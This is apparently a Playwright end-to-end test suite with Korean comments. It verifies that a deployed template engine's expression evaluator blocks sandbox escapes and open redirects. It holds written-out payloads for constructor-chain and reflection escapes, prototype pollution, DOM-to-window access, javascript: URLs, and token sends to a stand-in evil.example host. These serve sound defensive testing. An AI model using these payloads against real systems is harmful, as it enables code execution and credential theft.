/**
 * E2E: 레이아웃 표현식 평가 샌드박스 (배포 번들 기준, KVE-2026-1915)
 *
 * 배경: 표현식 평가가 `new Function`/`with(ctx)` 로 실행되어
 * `''.constructor.constructor('code')()` 형태의 샌드박스 탈출이 가능했다.
 * engine-v1.59.0 에서 화이트리스트 AST 평가기(SafeExpressionEvaluator)로 교체했다.
 *
 * 단위 테스트(SafeExpressionEvaluator.test.ts)가 소스 레벨을 잠그지만, 실제 사용자가
 * 실행하는 것은 빌드된 번들이므로 브라우저에서 배포 번들의 공개 API(`G7Core.evaluateCondition`)를
 * 그대로 호출해 (a) 정상 표현식 회귀 없음 + (b) 익스플로잇 미실행 양면을 잠근다.
 *
 * 시나리오 축(case)·효과는 매니페스트 tests/scenarios/layout-expression-sandbox.yaml 참조.
 * KVE-2026-2348 이동 sink 축(target_kind·sink)은 tests/scenarios/navigation-target-policy.yaml 참조.
 * 각 test 앞의 시나리오 라인 마커가 축 조합을, 효과 라인 마커가 효과를 커버한다.
 *
 * 효과 목록을 이 파일 레벨에 몰아 적지 않는다 — 커버리지 룰은 마커 레벨을 구분하지 않으므로,
 * 파일 레벨 목록이 있으면 해당 test 를 지워도 효과가 "언급됨" 으로 집계돼 삭제가 무증상 green
 * 이 된다. 마커는 test 에만 둔다.
 */
import { test, expect } from '../fixtures/auth';
import type { Page } from '@playwright/test';

/**
 * 엔진이 화면 이동까지 준비됐을 때까지 기다린다.
 *
 * `G7Core.evaluateCondition` 은 이동 함수가 문맥에 연결되기 전에 생긴다 — 그 시점에 `navigate` 를 dispatch 하면
 * 「Navigate function is not provided in context」 로 아무 일도 일어나지 않아, 거부 시험은 거부와 무동작을 가르지 못하고
 * 이동 시험은 시간 초과로 깨진다. 라우터가 이동 함수를 연결한 뒤에 첫 화면을 그리므로, 로그인 화면의 비밀번호 칸이
 * 보이는 것(로케일과 무관)을 준비 신호로 쓴다.
 *
 * @param page 페이지
 */
async function waitForNavigationReady(page: Page): Promise<void> {
  await page.waitForFunction(
    () => typeof (window as any).G7Core?.evaluateCondition === 'function' && typeof (window as any).G7Core?.dispatch === 'function',
    null,
    { timeout: 30_000 },
  );
  await expect(page.locator('input[type="password"]').first()).toBeVisible({ timeout: 30_000 });
}

/**
 * 거부돼야 할 주소로 navigate 를 dispatch 하고, **아무 데도 가지 않았음**을 확인한다.
 *
 * 거부된 주소는 이동하지 않는다(engine-v1.80.1, 결정 — 종전에는 첫 화면 `/` 로 문서 전체 이동). 「무동작」이
 * 「dispatch 가 실패해서 아무 일도 없었음」과 갈리도록 dispatch 결과가 오류가 아닌 것(이동 함수가 연결된 뒤 거부 분기를
 * 탔음)과, 그 뒤 메인 프레임 이동이 0 인 것을 함께 본다. 이동하지 않음은 「일어나지 않은 사건」이라 짧게 기다려 확인한다.
 *
 * @param page 페이지
 * @param path 거부돼야 할 주소
 * @param handler 디스패치할 이동 처리기(기본 navigate — redirect 는 같은 탭 sink 로 바로 간다)
 */
async function dispatchRejectedNavigate(page: Page, path: string, handler: 'navigate' | 'redirect' = 'navigate'): Promise<void> {
  const startUrl = page.url();
  let navigations = 0;
  const onNav = (frame: { parentFrame(): unknown }) => { if (frame.parentFrame() === null) navigations++; };
  page.on('framenavigated', onNav);

  const result = await page.evaluate(async ([p, h]) => {
    const params = h === 'redirect' ? { url: p } : { path: p };
    const r = await (window as any).G7Core.dispatch({ handler: h, params });
    return { success: r?.success, error: r?.error ? String(r.error?.message ?? r.error) : '' };
  }, [path, handler] as const);
  await page.waitForTimeout(1_500);
  page.off('framenavigated', onNav);

  expect(result.error, `dispatch 가 거부 분기 대신 실패했다: ${result.error}`).toBe('');
  expect(navigations, `${path} 로 문서가 이동했다`).toBe(0);
  expect(page.url()).toBe(startUrl);
}

test.describe('레이아웃 표현식 평가 샌드박스', () => {
  test.beforeEach(async ({ page }) => {
    // 코어 번들이 부팅된 화면이면 충분하다(로그인 화면도 엔진을 부팅한다).
    await page.goto('/admin/login');
    await waitForNavigationReady(page);
  });

  // @scenario case=safe_expression
  // @effects same_expression_same_value_across_paths
  test('정상 표현식(삼항·옵셔널체이닝·nullish)이 배포 번들에서 정상 평가된다', async ({ page }) => {
    const result = await page.evaluate(() => {
      const g7 = (window as any).G7Core;
      const ctx = { user: { name: '홍길동' }, count: 2 };
      return {
        ternary: g7.evaluateCondition('{{user?.name ? true : false}}', ctx),
        nullish: g7.evaluateCondition('{{(user?.missing ?? "fallback") === "fallback"}}', ctx),
        compare: g7.evaluateCondition('{{count > 1}}', ctx),
      };
    });

    expect(result.ternary).toBe(true);
    expect(result.nullish).toBe(true);
    expect(result.compare).toBe(true);
  });

  // @scenario case=arrow_template_literal
  // @effects same_expression_same_value_across_paths
  test('화살표 함수·스프레드·템플릿 리터럴·new Date 가 배포 번들에서 동작한다', async ({ page }) => {
    const result = await page.evaluate(() => {
      const g7 = (window as any).G7Core;
      const ctx = { items: [{ v: 'a' }, { v: 'b' }, { v: 'a' }], $args: ['x'] };
      return {
        // 화살표 함수 + includes
        arrow: g7.evaluateCondition("{{(items ?? []).filter(i => i.v === 'a').length === 2}}", ctx),
        // 스프레드 + Set + Array.from(new Set(...))
        spreadSet: g7.evaluateCondition("{{Array.from(new Set((items ?? []).map(i => i.v))).length === 2}}", ctx),
        // 템플릿 리터럴 (내비게이션 경로 조립 형태)
        template: g7.evaluateCondition('{{`/mypage/${$args[0]}` === "/mypage/x"}}', ctx),
        // new Date
        date: g7.evaluateCondition('{{new Date("2020-01-01").getTime() > 0}}', ctx),
      };
    });

    expect(result.arrow).toBe(true);
    expect(result.spreadSet).toBe(true);
    expect(result.template).toBe(true);
    expect(result.date).toBe(true);
  });

  // @scenario case=destructuring_param
  // @effects same_expression_same_value_across_paths
  test('화살표 파라미터 배열 구조분해(([k, v])·홀)가 배포 번들에서 동작한다 (engine-v1.60.5 회귀)', async ({ page }) => {
    const result = await page.evaluate(() => {
      const g7 = (window as any).G7Core;
      const ctx = {
        sel: { 5: 50, 6: null },
        perms: { 'admin.manage': true, read: true, write: false },
        errors: { name: ['이름은 필수입니다'] },
      };
      return {
        // _purchase_card.json 장바구니/바로구매 본문 형태 — 홀 + 쌍 분해
        hole: g7.evaluateCondition('{{Object.entries(sel ?? {}).filter(([, vid]) => vid != null).length === 1}}', ctx),
        pair: g7.evaluateCondition('{{Object.entries(sel ?? {}).filter(([, v]) => v != null).map(([gid, vid]) => Number(gid) + Number(vid)).includes(55)}}', ctx),
        single: g7.evaluateCondition('{{Object.entries(sel ?? {}).map(([k]) => k).includes("5")}}', ctx),
        // 게시판 환경설정 권한 computed 형태: filter([key]) + startsWith + map([key])
        entriesFilterMap: g7.evaluateCondition(
          "{{Object.entries(perms ?? {}).filter(([key]) => !key.startsWith('admin.')).map(([key]) => key).length === 2}}",
          ctx,
        ),
        // 검증 오류 표시 형태: ([field, messages])
        fieldMessages: g7.evaluateCondition(
          "{{Object.entries(errors ?? {}).map(([field, messages]) => field + ':' + messages[0])[0] === 'name:이름은 필수입니다'}}",
          ctx,
        ),
      };
    });

    expect(result.hole).toBe(true);
    expect(result.pair).toBe(true);
    expect(result.single).toBe(true);
    expect(result.entriesFilterMap).toBe(true);
    expect(result.fieldMessages).toBe(true);
  });

  // @scenario case=constructor_escape
  // @effects sandbox_escape_blocked, dangerous_payload_does_not_set_global
  test('constructor 체인 샌드박스 탈출이 코드를 실행하지 못한다', async ({ page }) => {
    const result = await page.evaluate(() => {
      const g7 = (window as any).G7Core;
      // 익스플로잇: 성공하면 window.__g7jsi 전역이 설정된다.
      delete (window as any).__g7jsi;
      const payloads = [
        "{{''.constructor.constructor('window.__g7jsi = 1')()}}",
        "{{''['constructor']['constructor']('window.__g7jsi = 2')()}}",
        '{{({}).__proto__}}',
        "{{Function('window.__g7jsi = 3')()}}",
      ];
      // 각 페이로드를 평가 — 평가기는 거부(예외→false)해야 하며 코드는 실행되지 않아야 한다.
      const results = payloads.map((p) => {
        try {
          return g7.evaluateCondition(p, {});
        } catch {
          return false;
        }
      });
      return {
        globalSet: (window as any).__g7jsi !== undefined,
        allBlocked: results.every((r) => !r),
      };
    });

    // 익스플로잇 코드가 실행되지 않았다(전역 canary 미설정).
    expect(result.globalSet).toBe(false);
    // 위험 표현식은 truthy 로 평가되지 않는다(거부).
    expect(result.allBlocked).toBe(true);
  });

  // @scenario case=nonstring_key_escape
  // @effects sandbox_escape_blocked, dangerous_payload_does_not_set_global
  test('비-문자열 computed 키·Object 리플렉션 탈출이 배포 번들에서 코드를 실행하지 못한다', async ({ page }) => {
    const result = await page.evaluate(() => {
      const g7 = (window as any).G7Core;
      delete (window as any).__g7jsi;
      const payloads = [
        // 배열 키가 ToPropertyKey 강제변환으로 constructor 도달 (engine-v1.60.1 이전 우회)
        "{{''[['constructor']][['constructor']]('window.__g7jsi = 1')()}}",
        // 문자열 조립 난독화 — 정적 룰이 못 잡는 형태(런타임 정규화가 최종 게이트)
        "{{''[['const' + 'ructor']][['const' + 'ructor']]('window.__g7jsi = 2')()}}",
        // 객체 toString 강제변환 키
        "{{''[{ toString: () => 'constructor' }]}}",
        // Object 리플렉션 static 으로 Function 도달
        "{{Object.getOwnPropertyDescriptor(Object.getPrototypeOf(String), 'constructor').value('window.__g7jsi = 3')()}}",
        // 프로토타입 오염 시도
        '{{Object.setPrototypeOf({}, { polluted: 1 })}}',
      ];
      const results = payloads.map((p) => {
        try {
          return g7.evaluateCondition(p, {});
        } catch {
          return false;
        }
      });
      return {
        globalSet: (window as any).__g7jsi !== undefined,
        allBlocked: results.every((r) => !r),
      };
    });

    expect(result.globalSet).toBe(false);
    expect(result.allBlocked).toBe(true);
  });

  // @scenario case=object_facade_safe
  // @effects same_expression_same_value_across_paths
  test('안전한 Object 데이터 메서드(keys/assign/create)가 배포 번들에서 정상 동작한다', async ({ page }) => {
    const result = await page.evaluate(() => {
      const g7 = (window as any).G7Core;
      const ctx = { o: { a: 1, b: 2 }, base: { x: 1 }, k: 'y', v: 2 };
      return {
        keys: g7.evaluateCondition("{{Object.keys(o).join(',') === 'a,b'}}", ctx),
        // 실제 레이아웃(_tab_reviews.json)의 필터 맵 생성 패턴
        createAssign: g7.evaluateCondition('{{Object.assign(Object.create(null), base, { [k]: v }).y === 2}}', ctx),
      };
    });

    expect(result.keys).toBe(true);
    expect(result.createAssign).toBe(true);
  });

  // @scenario case=host_graph_escape
  // @effects sandbox_escape_blocked, dangerous_payload_does_not_set_global, host_object_access_blocked
  test('DOM 노드에서 ownerDocument.defaultView 로 Window·localStorage 에 닿지 못한다 (KVE-2026-2350)', async ({ page }) => {
    const result = await page.evaluate(() => {
      const g7 = (window as any).G7Core;
      delete (window as any).__g7jsi;
      localStorage.removeItem('g7_expr_escape_marker');
      const img = document.createElement('img');
      document.body.appendChild(img);
      // 원본 이벤트 target 이 표현식에 실린 상황(게이트 우회 가정)을 그대로 재현한다
      const ctx = { $event: { target: img } };
      const payloads = [
        "{{$event.target.ownerDocument.defaultView.localStorage.setItem('g7_expr_escape_marker', 'WINDOW_REACHED') || true}}",
        "{{$event.target.ownerDocument.defaultView.__g7jsi = 1}}",
        "{{!!$event.target.ownerDocument.defaultView.fetch}}",
        "{{!!$event.target.ownerDocument.cookie.length}}",
      ];
      const results = payloads.map((p) => {
        try {
          return g7.evaluateCondition(p, ctx);
        } catch {
          return false;
        }
      });
      img.remove();
      return {
        marker: localStorage.getItem('g7_expr_escape_marker'),
        globalSet: (window as any).__g7jsi !== undefined,
        allBlocked: results.every((r) => !r),
        // 엔진이 실제로 싣는 plain 스냅샷($event DTO)은 그대로 평가된다
        normal: g7.evaluateCondition("{{$event.target.tagName === 'IMG'}}", { $event: { target: { tagName: 'IMG' } } }),
      };
    });

    expect(result.marker).toBeNull();
    expect(result.globalSet).toBe(false);
    expect(result.allBlocked).toBe(true);
    expect(result.normal).toBe(true);
  });

  // @scenario case=host_graph_escape
  // @effects api_call_credentials_same_origin_only, same_expression_same_value_across_paths
  test('apiCall 은 교차 출처 대상에 토큰을 싣지 않고 동일 출처에는 싣는다 (KVE-2026-2350 권한전이)', async ({ page }) => {
    // 요청은 가로채 헤더만 기록한다 — 외부로 실제 전송하지 않고 서버 상태도 바꾸지 않는다.
    const seen: Record<string, string | null> = {};
    await page.route('https://evil.example/**', async (route) => {
      seen.offsite = route.request().headers().authorization ?? null;
      await route.fulfill({ status: 200, contentType: 'application/json', body: '{}' });
    });
    await page.route('**/api/__kve_credential_probe__', async (route) => {
      seen.sameOrigin = route.request().headers().authorization ?? null;
      await route.fulfill({ status: 200, contentType: 'application/json', body: '{}' });
    });

    await page.evaluate(async () => {
      localStorage.setItem('auth_token', 'e2e-probe-token');
      const g7 = (window as any).G7Core;
      for (const target of ['https://evil.example/steal', '/api/__kve_credential_probe__']) {
        await g7.dispatch({ handler: 'apiCall', target, auth_required: true, params: { method: 'GET' } });
      }
      localStorage.removeItem('auth_token');
    });

    expect(seen.offsite).toBeNull();
    expect(seen.sameOrigin).toBe('Bearer e2e-probe-token');
  });

  // @scenario case=host_graph_escape
  // @effects cross_origin_identity_response_not_trusted, extension_token_same_origin_only
  test('외부 주소가 흉내 낸 428 은 본인인증을 시작하지 않고, 동일 출처 428 은 토큰을 실어 시작한다 (KVE-2026-2350)', async ({ page, baseURL }) => {
    // 관리자 템플릿 launcher(배포 번들)가 등록된 뒤에 잰다 — launcher 가 응답의 challenge_start_url 로 토큰을 싣는 주체다.
    await page.waitForFunction(() => (window as any).G7Core?.identity?.hasLauncher?.() === true, null, { timeout: 30_000 });

    const origin = new URL(baseURL!).origin;
    const cors = {
      'access-control-allow-origin': origin,
      'access-control-allow-credentials': 'true',
      'access-control-allow-headers': 'authorization, content-type, accept, accept-language, x-xsrf-token',
      'access-control-allow-methods': 'GET, POST, OPTIONS',
    };
    const identity428 = (challengeStartUrl: string) => JSON.stringify({
      success: false,
      error_code: 'identity_verification_required',
      message: '',
      verification: { policy_key: 'p', purpose: 'sensitive_action', render_hint: 'text_code', challenge_start_url: challengeStartUrl, return_request: null },
    });

    // 요청은 모두 가로채 헤더만 기록한다 — 외부로 실제 전송하지 않고 서버 상태도 바꾸지 않는다.
    const seen: { steal: Array<string | null>; challenge: Array<string | null> } = { steal: [], challenge: [] };
    await page.route('https://evil.example/**', async (route) => {
      const url = route.request().url();
      if (url.endsWith('/steal')) {
        seen.steal.push(route.request().headers().authorization ?? null);
        await route.fulfill({ status: 200, headers: cors, contentType: 'application/json', body: '{}' });
        return;
      }
      await route.fulfill({ status: 428, headers: cors, contentType: 'application/json', body: identity428('https://evil.example/steal') });
    });
    await page.route('**/api/__kve_428_probe__', async (route) => {
      await route.fulfill({ status: 428, contentType: 'application/json', body: identity428('/api/__kve_challenge_probe__') });
    });
    await page.route('**/api/__kve_challenge_probe__', async (route) => {
      seen.challenge.push(route.request().headers().authorization ?? null);
      await route.fulfill({ status: 500, contentType: 'application/json', body: '{"success":false,"message":"probe"}' });
    });

    // 교차 출처 428 — 응답을 받고 끝나야 하며, 흉내 낸 시작 주소로는 아무 요청도 가지 않는다.
    await page.evaluate(async () => {
      localStorage.setItem('auth_token', 'e2e-probe-token');
      const g7 = (window as any).G7Core;
      for (const target of ['https://evil.example/428', '//evil.example/428']) {
        await g7.dispatch({ handler: 'apiCall', target, auth_required: true, params: { method: 'GET' } }).catch(() => undefined);
      }
    });
    expect(seen.steal).toEqual([]);

    // 동일 출처 428 대조군 — launcher 가 시작 주소로 토큰을 실어 요청한다(정상 흐름이 살아 있음).
    const challengeRequest = page.waitForRequest('**/api/__kve_challenge_probe__');
    await page.evaluate(() => {
      void (window as any).G7Core.dispatch({ handler: 'apiCall', target: '/api/__kve_428_probe__', auth_required: true, params: { method: 'GET' } });
    });
    await challengeRequest;
    await page.evaluate(() => localStorage.removeItem('auth_token'));

    expect(seen.challenge).toEqual(['Bearer e2e-probe-token']);
  });

  // @scenario target_kind=script_scheme, sink=same_tab
  // @effects nav_sink_rejects_script_scheme
  test('navigate 로 흘러든 javascript: 경로는 실행되지 않고 같은 origin 에 머문다 (KVE-2026-2348)', async ({ page, baseURL }) => {
    await page.evaluate(() => localStorage.removeItem('g7_redirect_marker'));

    // 실행되지 않고, 아무 데도 가지 않는다(engine-v1.80.1 — 종전: 첫 화면 `/`)
    await dispatchRejectedNavigate(page, "javascript:localStorage.setItem('g7_redirect_marker','EXECUTED')");

    expect(new URL(page.url()).origin).toBe(new URL(baseURL!).origin);
    expect(await page.evaluate(() => localStorage.getItem('g7_redirect_marker'))).toBeNull();
  });

  // @scenario target_kind=offsite, sink=same_tab
  // @effects nav_sink_rejects_offsite_target
  test('navigate 로 흘러든 //외부 경로는 오프사이트로 나가지 않는다 (open-redirect 차단)', async ({ page, baseURL }) => {
    const site = new URL(baseURL!).origin;
    // 같은 사이트 전체 주소라도 경로가 `//다른호스트`(백슬래시 변형 포함)면 바깥 주소다
    for (const path of ['//example.com/', 'https://example.com/', `${site}//example.com/x`, `${site}/\\example.com/x`]) {
      await page.goto('/admin/login');
      await waitForNavigationReady(page);
      // 오프사이트로도, 첫 화면으로도 가지 않는다(engine-v1.80.1 — 종전: 첫 화면 `/`)
      await dispatchRejectedNavigate(page, path);

      expect(new URL(page.url()).origin).toBe(new URL(baseURL!).origin);
    }
  });

  // @scenario target_kind=offsite, sink=same_tab
  // @effects nav_sink_rejects_offsite_target
  test('redirect 로 온 같은 사이트 전체 주소의 //다른호스트 경로는 바깥으로 나가지 않는다 (open-redirect 차단)', async ({ page, baseURL }) => {
    // 같은 출처 전체 주소를 경로로 바꾸는 판정이 `//example.com/x` 를 돌려주면 location.assign 이 프로토콜 상대 주소로 읽는다
    const site = new URL(baseURL!).origin;
    for (const path of [`${site}//example.com/x`, `${site}/\\example.com/x`]) {
      await page.goto('/admin/login');
      await waitForNavigationReady(page);
      await dispatchRejectedNavigate(page, path, 'redirect');

      expect(new URL(page.url()).origin).toBe(site);
    }
  });

  // @scenario path_kind=script_scheme, fallback_path=valid
  // @scenario path_kind=offsite, fallback_path=valid
  // @scenario path_kind=relative, fallback_path=valid
  // @scenario path_kind=empty, fallback_path=valid
  // @effects rejected_path_uses_fallback_path, empty_path_uses_fallback_path
  test('거부·빈 주소 navigate 에 fallbackPath 를 적으면 그 경로로 화면 전환 없이 간다 (engine-v1.80.1)', async ({ page }) => {
    // 로그인 복귀(`?redirect=`)처럼 반드시 어딘가로 가야 하는 자리의 착지점. 상대 경로는 같은 탭 최종 판정이 거부하는 값이다.
    const cases = ["javascript:localStorage.setItem('g7_redirect_marker','EXECUTED')", '//example.com/x', 'admin/users', ''];
    await page.evaluate(() => { localStorage.removeItem('g7_redirect_marker'); (window as any).__g7FallbackMarker = 'kept'; });

    for (const [i, path] of cases.entries()) {
      await page.evaluate(
        ([p, fb]) => (window as any).G7Core.dispatch({ handler: 'navigate', params: { path: p, fallbackPath: fb } }),
        [path, `/admin/login?from=fallback-${i}`],
      );
      await page.waitForURL(new RegExp(`/admin/login\\?from=fallback-${i}$`));
    }

    // 문서를 다시 부르지 않았고(SPA 이동) 실행 주소는 실행되지 않았다
    expect(await page.evaluate(() => (window as any).__g7FallbackMarker)).toBe('kept');
    expect(await page.evaluate(() => localStorage.getItem('g7_redirect_marker'))).toBeNull();
  });

  // @scenario target_kind=same_origin_full_url, sink=same_tab
  // @effects same_origin_full_url_becomes_path
  test('같은 사이트 전체 주소로 navigate 하면 첫 화면이 아니라 그 경로로 화면 전환 없이 이동한다 (engine-v1.80.1)', async ({ page, baseURL }) => {
    // 알림 이동 주소(click_url)가 이 꼴이다. 종전: 라우트 미매칭 → 같은 탭 sink 가 스킴 거부 → `/` 로 문서 전체 이동.
    await page.evaluate(() => { (window as any).__g7SameOriginMarker = 'kept'; });
    const full = `${new URL(baseURL!).origin}/admin/login?from=full-url`;

    await page.evaluate((p) => (window as any).G7Core.dispatch({ handler: 'navigate', params: { path: p } }), full);
    await page.waitForURL(/\/admin\/login\?from=full-url$/);

    // 문서를 다시 부르지 않았다(SPA 이동) — 창 변수가 그대로 남는다
    expect(await page.evaluate(() => (window as any).__g7SameOriginMarker)).toBe('kept');
  });

  // @scenario target_kind=same_origin, sink=same_tab
  // @effects same_origin_redirect_preserved
  test('same-origin 경로 이동은 쿼리까지 그대로 동작한다 (정상 회귀)', async ({ page }) => {
    await page.evaluate(() =>
      (window as any).G7Core.dispatch({ handler: 'openWindow', params: { path: '/admin/login', query: { from: 'e2e' }, target: '_self' } }),
    );
    await page.waitForURL(/\/admin\/login\?from=e2e$/);
  });
});
